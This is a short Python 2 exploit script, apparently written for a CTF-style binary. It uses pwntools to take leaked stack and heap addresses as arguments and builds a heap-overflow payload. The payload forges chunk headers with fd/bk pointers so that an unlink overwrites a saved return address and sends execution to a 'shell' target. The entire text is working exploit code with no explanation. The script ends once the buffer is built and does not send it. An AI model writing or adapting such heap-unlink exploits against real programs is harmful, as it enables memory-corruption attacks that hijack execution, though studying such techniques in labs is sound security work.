from pwn import *
import sys

def pack(addr):
    i = struct.pack('<I', addr)
    return i

sal = int(sys.argv[1], 16)
hal = int(sys.argv[2], 16)

A = hal
B = hal + 0x18
C = hal + 0x30

print 'sal', hex(sal)
print 'hal', hex(hal)

main_eip = sal + 0x2c
shell = sal - 0xf7fb50e9

# B->bk must be main_eip
# B->fd must be shell

buffer = ''
buffer += pack(0) # A->buf
buffer += pack(0) # A->buf
buffer += pack(0) # 0x0

# B
buffer += pack(0x19)
buffer += pack(shell) # B->fd
buffer += pack(main_eip) # B->bk
buffer += pack(0x0) # B->buf
buffer += pack(0x0) # B->buf
buffer += pack(0x0) # B->buf

# C
buffer += pack(0x19)
buffer += pack(0x0) # C->fd
buffer += pack(B) # C->bk
buffer += pack(0x0) # C->buf
buffer += pack(0x0) # C->buf
buffer += pack(0x0) # C->buf
